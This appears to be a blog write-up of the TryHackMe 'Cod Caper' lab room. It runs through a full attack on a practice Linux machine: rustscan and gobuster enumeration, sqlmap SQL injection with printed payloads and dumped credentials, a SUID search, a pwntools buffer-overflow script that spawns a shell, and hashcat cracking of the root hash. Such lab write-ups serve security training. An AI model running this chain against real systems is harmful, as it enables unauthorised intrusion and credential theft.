---
title: "TryHackMe - The Cod Caper"
categories:
  - TryHackMe
tags:
  - nmap
  - gobuster
  - sqli
  - rce
  - writeup
  - tryhackme
---
A guided room taking you through infiltrating and exploiting a Linux system.

## Host Enumeration
- How many ports are open on the target machine?

    ```bash
    $ rustscan -a 10.10.139.250 --ulimit 10000 -- -A -v -Pn
    .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
    | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
    | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
    `-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
    The Modern Day Port Scanner.
    ________________________________________
    : https://discord.gg/GFrQsGy           :
    : https://github.com/RustScan/RustScan :
    --------------------------------------
    😵 https://admin.tryhackme.com

    [~] The config file is expected to be at "/home/kali/.rustscan.toml"
    [~] Automatically increasing ulimit value to 10000.
    Open 10.10.139.250:22
    Open 10.10.139.250:80
    [~] Starting Script(s)
    [>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    [~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-24 07:34 EST
    NSE: Loaded 153 scripts for scanning.
    NSE: Script Pre-scanning.
    NSE: Starting runlevel 1 (of 3) scan.
    Initiating NSE at 07:34
    Completed NSE at 07:34, 0.00s elapsed
    NSE: Starting runlevel 2 (of 3) scan.
    Initiating NSE at 07:34
    Completed NSE at 07:34, 0.00s elapsed
    NSE: Starting runlevel 3 (of 3) scan.
    Initiating NSE at 07:34
    Completed NSE at 07:34, 0.00s elapsed
    Initiating Parallel DNS resolution of 1 host. at 07:34
    Completed Parallel DNS resolution of 1 host. at 07:35, 13.01s elapsed
    DNS resolution of 1 IPs took 13.01s. Mode: Async [#: 1, OK: 0, NX: 0, DR: 1, SF: 0, TR: 3, CN: 0]
    Initiating Connect Scan at 07:35
    Scanning 10.10.139.250 [2 ports]
    Discovered open port 22/tcp on 10.10.139.250
    Discovered open port 80/tcp on 10.10.139.250
    Completed Connect Scan at 07:35, 0.19s elapsed (2 total ports)
    Initiating Service scan at 07:35
    Scanning 2 services on 10.10.139.250
    Completed Service scan at 07:35, 6.46s elapsed (2 services on 1 host)
    NSE: Script scanning 10.10.139.250.
    NSE: Starting runlevel 1 (of 3) scan.
    Initiating NSE at 07:35
    Completed NSE at 07:35, 5.63s elapsed
    NSE: Starting runlevel 2 (of 3) scan.
    Initiating NSE at 07:35
    Completed NSE at 07:35, 0.78s elapsed
    NSE: Starting runlevel 3 (of 3) scan.
    Initiating NSE at 07:35
    Completed NSE at 07:35, 0.00s elapsed
    Nmap scan report for 10.10.139.250
    Host is up, received user-set (0.19s latency).
    Scanned at 2021-01-24 07:35:07 EST for 13s

    PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
    | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf+PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe+e4ZNbsCvTc1AaYKVC+oguSNmT
    |   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
    | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=
    |   256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
    |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC
    80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```

    2 ports open, ssh and http.

- What is the http-title of the web server?
> Apache2 Ubuntu Default Page: It works
- What version is the ssh service?
> OpenSSH 7.2p2 Ubuntu 4ubuntu2.8
- What is the version of the web server?
> Apache/2.4.18

## Web Enumeration
- What is the name of the important file on the server?

    ```bash
    $ gobuster dir -u 10.10.139.250 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,jpg,html,css,jpeg,txt,conf,ini,bak,swp,db
    ===============================================================
    Gobuster v3.0.1
    by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
    ===============================================================
    [+] Url:            http://10.10.139.250
    [+] Threads:        50
    [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
    [+] Status codes:   200,204,301,302,307,401,403
    [+] User Agent:     gobuster/3.0.1
    [+] Extensions:     jpg,html,ini,db,php,css,jpeg,txt,conf,bak,swp
    [+] Timeout:        10s
    ===============================================================
    2021/01/24 07:39:15 Starting gobuster
    ===============================================================
    /index.html (Status: 200)
    /administrator.php (Status: 200)
    ```

    It's `/administrator.php`.

## Web Exploitation
The admin page seems to give us a login form. In situations like this it is always worth it to check for "low-hanging fruit". In the case of login forms one of the first things to check for is SQL Injection.
- What is the admin username?

    ```bash
    $ sqlmap -u http://10.10.139.250/administrator.php --forms --dump                             
            ___
        __H__
    ___ ___["]_____ ___ ___  {1.5#stable}
    |_ -| . [(]     | .'| . |
    |___|_  ["]_|_|_|__,|  _|
        |_|V...       |_|   http://sqlmap.org

    [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

    [*] starting @ 07:47:48 /2021-01-24/

    [07:47:48] [INFO] testing connection to the target URL
    [07:47:48] [INFO] searching for forms
    [#1] form:
    POST http://10.10.139.250/administrator.php
    POST data: username=&password=
    do you want to test this form? [Y/n/q] 
    > 
    Edit POST data [default: username=&password=] (Warning: blank fields detected): 
    do you want to fill blank fields with random values? [Y/n] 
    [07:47:50] [INFO] using '/home/kali/.local/share/sqlmap/output/results-01242021_0747am.csv' as the CSV results file in multiple targets mode
    [07:47:50] [INFO] checking if the target is protected by some kind of WAF/IPS

    [07:47:50] [INFO] testing if the target URL content is stable
    [07:47:51] [INFO] target URL content is stable
    [07:47:51] [INFO] testing if POST parameter 'username' is dynamic
    [07:47:51] [WARNING] POST parameter 'username' does not appear to be dynamic
    [07:47:51] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
    [07:47:51] [INFO] heuristic (XSS) test shows that POST parameter 'username' might be vulnerable to cross-site scripting (XSS) attacks
    [07:47:51] [INFO] testing for SQL injection on POST parameter 'username'
    it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
    for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
    [07:47:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [07:47:53] [WARNING] reflective value(s) found and filtering out
    [07:47:55] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
    [07:47:56] [INFO] testing 'Generic inline queries'
    [07:47:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
    [07:48:08] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
    [07:48:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
    [07:48:32] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
    [07:48:33] [INFO] POST parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --not-string="Got")
    [07:48:33] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
    [07:48:33] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
    [07:48:34] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
    [07:48:34] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
    [07:48:34] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
    [07:48:34] [INFO] POST parameter 'username' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
    [07:48:34] [INFO] testing 'MySQL inline queries'
    [07:48:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
    [07:48:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
    [07:48:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
    [07:48:36] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
    [07:48:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
    [07:48:36] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
    [07:48:36] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
    [07:48:47] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
    [07:48:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
    [07:48:47] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
    [07:48:47] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
    [07:48:48] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
    [07:48:49] [INFO] target URL appears to have 2 columns in query
    do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] 
    injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
    [07:49:06] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
    [07:49:11] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
    [07:49:17] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
    [07:49:22] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
    [07:49:28] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
    [07:49:34] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
    [07:49:39] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
    [07:49:45] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
    [07:49:51] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
    [07:49:56] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
    POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
    sqlmap identified the following injection point(s) with a total of 383 HTTP(s) requests:
    ---
    Parameter: username (POST)
        Type: boolean-based blind
        Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
        Payload: username=GAyx' RLIKE (SELECT (CASE WHEN (5915=5915) THEN 0x47417978 ELSE 0x28 END))-- rUsY&password=

        Type: error-based
        Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
        Payload: username=GAyx' AND GTID_SUBSET(CONCAT(0x71787a7871,(SELECT (ELT(8434=8434,1))),0x7170706a71),8434)-- LgrE&password=

        Type: time-based blind
        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
        Payload: username=GAyx' AND (SELECT 5335 FROM (SELECT(SLEEP(5)))Qnko)-- TMaE&password=
    ---
    do you want to exploit this SQL injection? [Y/n] 
    [07:50:43] [INFO] the back-end DBMS is MySQL
    back-end DBMS: MySQL >= 5.6
    [07:50:45] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
    [07:50:45] [INFO] fetching current database
    [07:50:45] [INFO] retrieved: 'users'
    [07:50:45] [INFO] fetching tables for database: 'users'
    [07:50:45] [INFO] retrieved: 'users'
    [07:50:45] [INFO] fetching columns for table 'users' in database 'users'
    [07:50:46] [INFO] retrieved: 'username'
    [07:50:46] [INFO] retrieved: 'varchar(100)'
    [07:50:47] [INFO] retrieved: 'password'
    [07:50:47] [INFO] retrieved: 'varchar(100)'
    [07:50:47] [INFO] fetching entries for table 'users' in database 'users'
    [07:50:47] [INFO] retrieved: 'secretpass'
    [07:50:48] [INFO] retrieved: 'pingudad'
    Database: users
    Table: users
    [1 entry]
    +------------+----------+
    | password   | username |
    +------------+----------+
    | secretpass | pingudad |
    +------------+----------+
    ```
    It's `pingudad`.

- What is the admin password?
> secretpass
- How many forms of SQLI is the form vulnerable to?
> 3

## Command Execution
It seems we have gained the ability to run commands! Since this is my old PC, I should still have a user account! Let's run a few test commands, and then try to gain access!

- How many files are in the current directory?

    <a href="/assets/images/tryhackme/the-cod-caper/1.png"><img src="/assets/images/tryhackme/the-cod-caper/1.png"></a>

- Do I still have an account

    <a href="/assets/images/tryhackme/the-cod-caper/2.png"><img src="/assets/images/tryhackme/the-cod-caper/2.png"></a>

- What is my ssh password?

    ```bash
    www-data@ubuntu:/var$ ls
    ls
    backups  cache  hidden  lib  local  lock  log  mail  opt  run  spool  tmp  www
    www-data@ubuntu:/var$ cd hidden
    cd hidden
    www-data@ubuntu:/var/hidden$ ls
    ls
    pass
    www-data@ubuntu:/var/hidden$ cat pass
    cat pass
    pinguapingu
    ```

## LinEnum
- What is the interesting path of the interesting suid file

    ```bash
    www-data@ubuntu:/tmp$ find / -perm -u=s -type f 2>/dev/null
    find / -perm -u=s -type f 2>/dev/null
    /opt/secret/root
    /usr/bin/sudo
    /usr/bin/vmware-user-suid-wrapper
    /usr/bin/chsh
    /usr/bin/passwd
    /usr/bin/gpasswd
    /usr/bin/newgrp
    /usr/bin/chfn
    /usr/lib/openssh/ssh-keysign
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /bin/ping
    /bin/su
    /bin/ping6
    /bin/ntfs-3g
    /bin/mount
    /bin/fusermount
    /bin/umount
    ```

## Binary Exploitation
Use this code to execute the `shell_func` at `/opt/secret/root`.

```python
from pwn import *
proc = process('/opt/secret/root')
elf = ELF('/opt/secret/root')
shell_func = elf.symbols.shell
payload = fit({
44: shell_func # this adds the value of shell_func after 44 characters
})
proc.sendline(payload)
proc.interactive()
```

## Finishing the job
We got root hashed password, let's crack it using hashcat.

```bash
$ hashcat -m 1800 -a 0 hash /usr/share/wordlists/rockyou.txt                                                                                    1 ⨯
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz, 2177/2241 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Uses-64-Bit

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344393
* Bytes.....: 139921520
* Keyspace..: 14344386
* Runtime...: 2 secs

$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: sha512crypt $6$, SHA512 (Unix)
Hash.Target......: $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.o...x00Ck.
Time.Started.....: Sun Jan 24 10:21:35 2021 (2 mins, 19 secs)
Time.Estimated...: Sun Jan 24 10:23:54 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     1721 H/s (4.81ms) @ Accel:16 Loops:512 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 239904/14344386 (1.67%)
Rejected.........: 0/239904 (0.00%)
Restore.Point....: 239808/14344386 (1.67%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000
Candidates.#1....: love4hate -> lopez01

Started: Sun Jan 24 10:21:31 2021
Stopped: Sun Jan 24 10:23:56 2021
```

- What is the root password!
> love2fish

